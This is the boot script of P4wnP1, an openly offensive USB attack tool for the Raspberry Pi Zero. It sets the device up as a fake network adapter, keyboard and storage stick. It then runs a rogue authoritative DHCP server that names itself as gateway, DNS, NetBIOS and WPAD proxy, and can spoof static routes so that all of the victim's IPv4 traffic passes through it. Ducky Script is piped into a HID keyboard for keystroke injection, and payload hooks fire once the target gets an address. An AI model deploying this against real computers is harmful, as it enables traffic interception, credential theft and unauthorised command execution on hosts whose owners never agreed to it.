#!/bin/sh
#
# P4wnP1 (PiZero IPv4 traffic interceptor and USB hash stealer)
# startup script
# 	Author:	Marcus Mengs (MaMe82)
#
# Notes:
# 	- setup_p4wnp1.sh should be ran before using this script
#	- refer to comments for "inner workings"
#	- work in progress (contains possible errors and typos)
#	- if the device isn't detected changing the USB port (USB 2.0 prefered) or plug out and in
#	  again could help
#	- ssh service should be running, so your're able to connect with
#		$ ssh pi@172.16.0.1
#
#
# ToDo:
#	- add manual system date adjusment, to not mess up logs due to missing NTP (store datetime of last boot)
#	- after implementing multiple stages, add in LED support to highlight which stage currently is ran
#	  by  P4wnP1
#	- add shutdown capability to script, to allow file system syncing before power loss
#	- detect if HID works (send CAPS_LOCK and read back LED byte), add payload callback onHIDstarted


hostname p4wnp1
echo p4wnp1 > /etc/hostname

# set manual configuration for usb1 (CDC ECM) if not already done
if ! grep -q -E '^127\.0\.0\.1 p4wnp1$' /etc/hosts; then
	echo "127.0.0.1 p4wnp1" >> /etc/hosts
fi



# find working dir of script
wdir=$( cd $(dirname $BASH_SOURCE[0]) && pwd)

# include setup.cfg
source $wdir/setup.cfg
# include payload
source $wdir/payloads/$PAYLOAD

# ====================
# USB Init
# ====================

echo "Starting P4wnP1..."
GADGETS_DIR="mame82gadget"

# configure USB gadget to provide (RNDIS like) ethernet interface
# see http://isticktoit.net/?p=1383
# ----------------------------------------------------------------

cd /sys/kernel/config/usb_gadget
mkdir -p $GADGETS_DIR
cd $GADGETS_DIR

# configure gadget details
# =========================
# set Vendor ID
#echo 0xc1cb > idVendor # RNDIS
echo $USB_VID > idVendor # RNDIS
# set Product ID
#echo 0xbaa2 > idProduct # RNDIS
echo $USB_PID > idProduct # RNDIS
# set device version 1.0.0
echo 0x0100 > bcdDevice
# set USB mode to USB 2.0
echo 0x0200 > bcdUSB


# composite class / subclass / proto (needs single configuration)
echo 0xEF > bDeviceClass
echo 0x02 > bDeviceSubClass
echo 0x01 > bDeviceProtocol

# set device descriptions
mkdir -p strings/0x409 # English language strings
# set serial
echo "deadbeefdeadbeef" > strings/0x409/serialnumber
# set manufacturer
echo "MaMe82" > strings/0x409/manufacturer
# set product
echo "P4wnP1 by MaMe82" > strings/0x409/product

# create configuration instance (for RNDIS, ECM and HDI in a SINGLE CONFIGURATION to support Windows composite device enumeration)
# ================================================================================================================================
mkdir -p configs/c.1/strings/0x409
echo "Config 1: RNDIS network" > configs/c.1/strings/0x409/configuration
echo 250 > configs/c.1/MaxPower
#echo 0xC0 > configs/c.1/bmAttributes # self powered device
echo 0x80 > configs/c.1/bmAttributes #  USB_OTG_SRP | USB_OTG_HNP

# create RNDIS function
# =======================================================
if $USE_RNDIS; then
mkdir -p functions/rndis.usb0
# set up mac address of remote device
echo "42:63:65:13:34:56" > functions/rndis.usb0/host_addr
# set up local mac address
echo "42:63:65:66:43:21" > functions/rndis.usb0/dev_addr
fi

# create CDC ECM function
# =======================================================
if $USE_ECM; then
mkdir -p functions/ecm.usb1
# set up mac address of remote device
echo "42:63:65:12:34:56" > functions/ecm.usb1/host_addr
# set up local mac address
echo "42:63:65:65:43:21" > functions/ecm.usb1/dev_addr
fi

# create HID function
# =======================================================
if $USE_HID; then
mkdir -p functions/hid.g1
echo 1 > functions/hid.g1/protocol
echo 1 > functions/hid.g1/subclass
echo 8 > functions/hid.g1/report_length
cat $wdir/conf/report_desc > functions/hid.g1/report_desc
fi

# create RAW HID function
# =======================================================
if $USE_RAWHID; then
mkdir -p functions/hid.g2
echo 1 > functions/hid.g2/protocol
echo 1 > functions/hid.g2/subclass
echo 64 > functions/hid.g2/report_length
cat $wdir/conf/raw_report_desc > functions/hid.g2/report_desc
fi

# create two RAW HID functions to achieve full duplex
# =======================================================
if $USE_RAWHID_FULLDUPLEX; then
mkdir -p functions/hid.in
echo 1 > functions/hid.in/protocol
echo 1 > functions/hid.in/subclass
echo 64 > functions/hid.in/report_length
cat $wdir/conf/raw_hid_in_desc > functions/hid.in/report_desc

mkdir -p functions/hid.out
echo 1 > functions/hid.out/protocol
echo 1 > functions/hid.out/subclass
echo 64 > functions/hid.out/report_length
cat $wdir/conf/raw_hid_out_desc > functions/hid.out/report_desc
fi


# Create USB Mass storage
# ==============================
if $USE_UMS; then
mkdir -p functions/mass_storage.usb0
echo 1 > functions/mass_storage.usb0/stall # allow bulk EPs
echo 0 > functions/mass_storage.usb0/lun.0/cdrom # don't emulate CD-ROm
echo 0 > functions/mass_storage.usb0/lun.0/ro # write acces
# enable Force Unit Access (FUA) to make Windows write synchronously
# this is slow, but unplugging the stick without unmounting works
echo 0 > functions/mass_storage.usb0/lun.0/nofua 
echo $wdir/USB_STORAGE/image.bin > functions/mass_storage.usb0/lun.0/file
fi

# Create ACM serial adapter (disable, use SSH)
# ============================================
#mkdir -p functions/acm.GS0


# add OS specific device descriptors to force Windows to load RNDIS drivers
# =============================================================================
# Witout this additional descriptors, most Windows system detect the RNDIS interface as "Serial COM port"
# To prevent this, the Microsoft specific OS descriptors are added in here
# !! Important:
#	If the device already has been connected to the Windows System without providing the
#	OS descriptor, Windows never asks again for them and thus never installs the RNDIS driver
#	This behavior is driven by creation of an registry hive, the first time a device without 
#	OS descriptors is attached. The key is build like this:
#
#	HKLM\SYSTEM\CurrentControlSet\Control\usbflags\[USB_VID+USB_PID+bcdRelease\osvc
#
#	To allow Windows to read the OS descriptors again, the according registry hive has to be
#	deleted manually or USB descriptor values have to be cahnged (f.e. USB_PID).
if $USE_RNDIS; then
mkdir -p os_desc
echo 1 > os_desc/use
echo 0xbc > os_desc/b_vendor_code
echo MSFT100 > os_desc/qw_sign

mkdir -p functions/rndis.usb0/os_desc/interface.rndis
echo RNDIS > functions/rndis.usb0/os_desc/interface.rndis/compatible_id
echo 5162001 > functions/rndis.usb0/os_desc/interface.rndis/sub_compatible_id
fi

# bind function instances to respective configuration
# ====================================================

if $USE_RNDIS; then
ln -s functions/rndis.usb0 configs/c.1/ # RNDIS on config 1 # RNDIS has to be the first interface on Composite device
fi

if $USE_HID; then
ln -s functions/hid.g1 configs/c.1/ # HID on config 1
fi

if $USE_RAWHID; then
ln -s functions/hid.g2 configs/c.1/ # HID on config 1
fi

if $USE_RAWHID_FULLDUPLEX; then
ln -s functions/hid.in configs/c.1/ # HID input device (to host) on config 1
ln -s functions/hid.out configs/c.1/ # HID output device (from host) on config 1
fi

if $USE_ECM; then
ln -s functions/ecm.usb1 configs/c.1/ # ECM on config  1
fi

if $USE_UMS; then
ln -s functions/mass_storage.usb0 configs/c.1/ # USB Mass Storage on config  1
fi

#ln -s functions/acm.GS0 configs/c.1/ # USB Mass Storage on config  1

if $USE_RNDIS; then
ln -s configs/c.1/ os_desc # add config 1 to OS descriptors
fi

# check for first available UDC driver
UDC_DRIVER=$(ls /sys/class/udc | cut -f1 | head -n 1)
# bind USB gadget to this UDC driver
echo $UDC_DRIVER > UDC

sleep 0.2 # give UDC some time to init

function detect_usb_hostmode()
{
	if grep -q "DCFG=0x00000000" /sys/kernel/debug/20980000.usb/state; then
		echo "USB OTG Mode"
		echo "As P4wnP1 is detected to run in Host (interactive) mode, we abort device setup now!"
		exit
	else
		echo "USB OTG off, going on with P4wnP1 boot"
	fi
}

detect_usb_hostmode


# =================================
# Network init
# =================================

function start_DHCP_server()
{

	# recreate DHCP config
	if $ROUTE_SPOOF; then
		# DHCP config with static route spoofing
		cat <<- EOF > $wdir/dnsmasq.conf
			port=0
			listen-address=$IF_IP
			dhcp-range=$IF_DHCP_RANGE,$IF_MASK,5m
			dhcp-option=252,http://$IF_IP/wpad.dat

			# router
			dhcp-option=3,$IF_IP

			# DNS
			dhcp-option=6,$IF_IP

			# NETBIOS NS
			dhcp-option=44,$IF_IP
			dhcp-option=45,$IF_IP

			# routes static (route 0.0.0.1 to 127.255.255.254 through our device)
			dhcp-option=121,0.0.0.0/1,$IF_IP,128.0.0.0/1,$IF_IP
			# routes static (route 128.0.0.1 to 255.255.255.254 through our device)
			dhcp-option=249,0.0.0.0/1,$IF_IP,128.0.0.0/1,$IF_IP

			dhcp-leasefile=/tmp/dnsmasq.leases
			dhcp-authoritative
			log-dhcp
		EOF
	else
		# DHCP config without static route spoofing
		cat <<- EOF > $wdir/dnsmasq.conf
			port=0
			listen-address=$IF_IP
			dhcp-range=$IF_DHCP_RANGE,$IF_MASK,5m
			dhcp-option=252,http://$IF_IP/wpad.dat

			# router
			dhcp-option=3,$IF_IP

			# DNS
			dhcp-option=6,$IF_IP

			# NETBIOS NS
			dhcp-option=44,$IF_IP
			dhcp-option=45,$IF_IP

			dhcp-leasefile=/tmp/dnsmasq.leases
			dhcp-authoritative
			log-dhcp
		EOF
	fi;

	# setup interface with correct IP
	ifconfig $active_interface $IF_IP netmask $IF_MASK

	# start DHCP server (listening on IF_IP)
	dnsmasq -C $wdir/dnsmasq.conf
}

# output raw ASCII to HID keyboard
function outhid()
{
#	cat | python $wdir/duckencoder/duckencoder.py -l $lang -r | python $wdir/transhid.py > /dev/hidg0
	cat | python $wdir/duckencoder/duckencoder.py -l $lang -r | python $wdir/transhid.py 
}

# output DUCKY SCRIPT to HID keyboard
function duckhid()
{
#	cat | python $wdir/duckencoder/duckencoder.py -l $lang -p | python $wdir/transhid.py > /dev/hidg0
	cat | python $wdir/duckencoder/duckencoder.py -l $lang -p | python $wdir/transhid.py 
}

function key_trigger()
{
	sudo python $wdir/hidtools/watchhidled.py trigger
	return $?
}

function detect_active_interface()
{


	# Waiting for one of the interfaces to get a link (either RNDIS or ECM)
	#    loop count is limited by $RETRY_COUNT_LINK_DETECTION, to continue execution if this is used 
	#    as blocking boot script
	#    note: if the loop count is too low, windows may not have enough time to install drivers

	# ToDo: check if operstate could be used for this, without waiting for carrieer
	active_interface="none"
	if $USE_RNDIS && $USE_ECM; then
		# bring up both interfaces to check for physical link
		ifconfig usb0 up
		ifconfig usb1 up

		echo "CDC ECM and RNDIS active. Check which interface has to be used via Link detection"
		while [ "$active_interface" == "none" ]; do
		#while [[ $count -lt $RETRY_COUNT_LINK_DETECTION ]]; do
			printf "."

			if [[ $(</sys/class/net/usb0/carrier) == 1 ]]; then
				# special case: macOS/Linux Systems detecting RNDIS should use CDC ECM anyway
				# make sure ECM hasn't come up, too
				sleep 0.5
				if [[ $(</sys/class/net/usb1/carrier) == 1 ]]; then
					echo "Link detected on usb1"; sleep 2
					active_interface="usb1"
					ifconfig usb0 down

					break
				fi

				echo "Link detected on usb0"; sleep 2
				active_interface="usb0"
				ifconfig usb1 down

				break
			fi

			# check ECM for link
			if [[ $(</sys/class/net/usb1/carrier) == 1 ]]; then
				echo "Link detected on usb1"; sleep 2
				active_interface="usb1"
				ifconfig usb0 down

				break
			fi

			# check RNDIS for link

			sleep 0.5
		done
	fi

	# if eiter one, RNDIS or ECM is active, wait for link on one of both
	if ($USE_RNDIS && ! $USE_ECM) || (! $USE_RNDIS && $USE_ECM); then 
		# bring up interface
		ifconfig usb0 up

		echo "CDC ECM or RNDIS active. Check which interface has to be used via Link detection"
		while [ "$active_interface" == "none" ]; do
			printf "."

			if [[ $(</sys/class/net/usb0/carrier) == 1 ]]; then
				echo "Link detected on usb0"; sleep 2
				active_interface="usb0"
				break
			fi
		done
	fi

	# if active_interface not "none" (RNDIS or CDC ECM are running)
	if [ "$active_interface" != "none" ]; then
		# setup DHCP server
		start_DHCP_server

		# call onNetworkUp() from payload
		declare -f onNetworkUp > /dev/null && onNetworkUp

		# wait for client to receive DHCP lease
		target_ip=""
		while [ "$target_ip" == "" ]; do
			target_ip=$(cat /tmp/dnsmasq.leases | cut -d" " -f3)
		done

		# call onNetworkUp() from payload
		declare -f onTargetGotIP > /dev/null && onTargetGotIP
	fi

}

function detect_HID_keyboard()
{
	# trigger kernel crash, by writing data to hid device before driver is installed on target host
#	while $true; do
#		ls -la /dev/hidg*
#		#echo -ne "\x00\x00\x53\x00\x00\x00\x00\x00" > /dev/hidg0
#		echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00" > /dev/hidg0
#		cat /dev/hidg0
#	done


	# if USE_HID is set, start checking if keyboard is present
	if $USE_HID && $HID_KEYBOARD_TEST; then
		echo "Waiting for HID keyboard to be usable..."
		# the "watchhidled.py check" presses the NUMLOCK button and reads back the LED
		# state to detect if the keyboard is working
		# To achieve this the NUMLOCK key press has to be written to /dev/hidg0
		# Unfortunately writing to /dev/hidg0 results in a KERNEL PANIC (unresponsive interrupt)
		# if the host isn't writing back data. So we don't use the LED check

		#python $wdir/hidtools/watchhidled.py check
		#res=$?
		#if [ $res -eq 0 ]; then
		#	echo "HID keyboard is up"
		#	# correct result, trigger onKeyboardUp() if the function is defined in payload
		#	declare -f onKeyboardUp > /dev/null && onKeyboardUp
		#else
		#	echo "Failed to detect HID Keyboard"
		#fi

		# new approach - reading back LED status from the HID report is a blocking call, which
		# doesn't crash the kernel if the host doesn't answer. It comes in handy, that an initial
		# report is written by the host after the driver is initialized (at least by Windows)
		# So we use the blocking read call to detect if the HID keyboard driver is installed

		# blocking read of LED status
		python -c "with open('/dev/hidg0','rb') as f:  print ord(f.read(1))"
		# fire 'onKeyboardUp' after read has succeeded
		declare -f onKeyboardUp > /dev/null && onKeyboardUp

	fi
}


detect_active_interface&
detect_HID_keyboard&
declare -f onBootFinished > /dev/null && onBootFinished
